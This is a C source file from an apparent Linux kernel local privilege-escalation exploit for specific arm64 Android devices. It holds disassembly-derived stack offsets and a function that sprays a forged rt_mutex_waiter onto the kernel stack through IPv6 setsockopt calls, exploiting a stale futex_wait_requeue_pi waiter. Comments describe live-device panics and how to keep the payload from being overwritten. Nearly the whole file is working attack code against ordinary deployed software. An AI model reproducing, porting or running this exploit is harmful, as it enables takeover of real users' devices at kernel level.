/*
 * BVK1 (5.10.81) geometry — derived from disassembly of the stock vmlinux:
 *
 *   futex chain frames before futex_wait_requeue_pi entry:
 *     __arm64_sys_futex (@0xffffffc008237490):  sub sp, #0x70
 *     do_futex (@0xffffffc00822e320):           sub sp, #0x20
 *                                               ────
 *                                               0x90
 *
 *   futex_wait_requeue_pi (@0xffffffc0082325b8):
 *     sub sp, sp, #0x1a0
 *     add x27, sp, #0x90          ← x27 = &rt_waiter
 *     → rt_waiter = kernel_top - 0x90 - 0x110 = kernel_top - 0x1a0
 *
 *   setsockopt chain frames before do_ipv6_setsockopt entry:
 *     __arm64_sys_setsockopt:     0x10 (stp -0x10!)
 *     __sys_setsockopt:           0x70
 *     sock_common_setsockopt:     0x10 (stp -0x10!, blr x8)
 *     udpv6_setsockopt:           0x40 (stp -0x40!, bl do_ipv6 for SOL_IPV6)
 *                               ────
 *                               0xd0
 *
 *   do_ipv6_setsockopt (@0xffffffc0095a1974):
 *     stp x29, x30, [sp, #-0x60]!    → sp -= 0x60
 *     sub sp, sp, #0x270             → total frame 0x2d0
 *     native branch: memset(sp+0x150, 0, 0x108); copy_from_user(sp+0x150,
 *     optval, 0x108) at +0x140..+0x150 → gr = kernel_top - 0xd0 - 0x2d0 +
 *     0x150 = kernel_top - 0x250
 *
 *   STAMP_OFF = rt_waiter - gr = (kernel_top - 0x1a0) - (kernel_top - 0x250)
 *             = 0xb0
 *
 *   Fit check: 0xb0 + 0x50 (waiter size) = 0x100 <= 0x108 (window). ✓
 */
#define _GNU_SOURCE

#include <errno.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include "utils.h"

#ifndef pr_debug
#define pr_debug(fmt, ...) ((void)0)
#endif

extern atomic_int g_consumer_go;

/*
 * BVK1 5.10.81: stale rt_waiter lands at stamp buffer +0xb0 (disassembly-derived;
 * see the geometry block above).  S901W 5.10.168 used +0x60; b0q compat used +0x58.
 */
#define STAMP_OFF       0xb0
/* v5.10 rt_mutex_waiter = 80 bytes */
#define WAITER_BYTES    0x50
/* Native group_source_req = 264 bytes (not 260 compat); optlen must match. */
#define STAMP_OPTLEN    264
/* Enough stamps to be sure the full payload is what the last completed
 * call left on the stack; after the loop we never enter the kernel again. */
#define STAMP_ROUNDS    64

void do_stamp_stack(uint64_t *buf) {
    int fd = socket(AF_INET6, SOCK_DGRAM, 0);
    uint8_t buffer[STAMP_OPTLEN];
    if (fd < 0) {
        pr_warning("do_stamp_stack: socket failed errno=%d\n", errno);
        _exit(1);   /* let the parent retry with a fresh child */
    }
    memset(buffer, 0, sizeof(buffer));
    memcpy(buffer + STAMP_OFF, buf, WAITER_BYTES);

    /*
     * Probe ONE stamp and report it BEFORE the real loop.  After the last
     * setsockopt this thread must make NO more syscalls until the consumer
     * fires: any syscall re-enters the kernel on THIS stack and its frames
     * land right on the stale waiter, tearing the payload.  Observed live
     * (gdb-mcp, TRIG dump): a post-loop pr_warning()'s write() left a
     * file_tty_write frame on the slot (saved LR at waiter+0x18) between
     * the last stamp and the walk -> junk waiter->lock ->
     * rt_mutex_adjust_prio_chain+388 panic (device: waiter->lock=1).
     *
     * Native path (TIF_32BIT=0): do_ipv6_setsockopt takes the native
     * group_source_req branch unconditionally.  optlen=264 is accepted;
     * EACCES = SELinux denied before the copy (stamp did NOT land);
     * EADDRNOTAVAIL/EINVAL = late validation, copy already done (stamp lands);
     * rc=0 = socket actually joined (stamp lands).
     */
    errno = 0;
    {
        int rc = setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP,
                            buffer, STAMP_OPTLEN);
        if (rc != 0 && errno == EACCES)
            pr_warning("stamp probe: EACCES — denied BEFORE the copy, "
                       "payload will NOT land\n");
        else if (rc != 0)
            pr_info("stamp probe: rc=%d errno=%d — late validation, "
                    "copy done (stamp lands)\n", rc, errno);
        else
            pr_info("stamp probe: setsockopt succeeded\n");
    }

    for (int i = 0; i < STAMP_ROUNDS; i++)
        setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP,
                   buffer, STAMP_OPTLEN);

    /* Payload is parked: from here on this thread makes NO syscalls, so
     * nothing memsets or overwrites the waiter region again. */
    atomic_store(&g_consumer_go, 1);
    for (;;)
        __asm__ volatile("nop" ::: "memory");
}

